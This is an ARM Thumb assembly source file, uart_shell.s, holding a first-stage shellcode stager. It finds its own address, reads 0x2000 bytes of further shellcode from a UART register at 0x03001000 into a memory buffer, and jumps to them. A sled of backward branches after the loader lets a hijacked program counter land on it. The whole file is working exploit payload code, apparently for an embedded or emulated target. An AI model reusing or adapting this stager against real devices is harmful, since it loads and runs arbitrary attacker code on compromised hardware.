@ uart_shell.s
.syntax unified
.thumb
.arch armv6-m
.text
    @ NOP                 @ may or may not be needed depending on the alignment of your shellcode
    MOV R0, PC          @ load PC into R0 so we can do relative addressing
    LSRS R0, R0, #1     @ clip off the extra bit at the end
    LSLS R0, R0, #1     @ unshift
    MOV R4, R0          @ initialize the literal pointer
    ADDS R4, #28        @ add offset
    LDR R1, [R4]        @ load the I/O address; R1 = 0x03001000; this is where R0 points to
    LDR R2, [R4, #4]    @ index variable, initialize to max shellcode size; R2 = 0x2000
    LDR R5, [R4, #8]    @ get the shellcode buffer address
    ADDS R6, R5, #1     @ keep a copy of the front with the thumb bit set
    LDR R3, [R1]        @ read a byte from UART
    STRB R3, [R5]       @ add the instruction to memory
    ADDS R5, #1         @ increment the shellcode pointer
    SUBS R2, R2, #1     @ subtract index variable by 1; R2 = R2 - 1
    BNE . - 8           @ if index != 0, go back 4 instructions
    BX R6               @ jump to shellcode
    NOP                 @ align words so LDR works
    .WORD 0x03001000    @ bits of our I/O address 0x03001000, little endian
    .WORD 0x00002000    @ size of our UART shellcode, 0x2000, little endian
    .WORD 0x02000000    @ the bottom of our stack (lowest address of the stack)
    @ jump on the trampoline :D (set our PC to one of these instrucions)
    B . - 44
    B . - 46
    B . - 48
    B . - 50
    B . - 52
    B . - 54
    B . - 56
    B . - 58
    B . - 60
    B . - 62
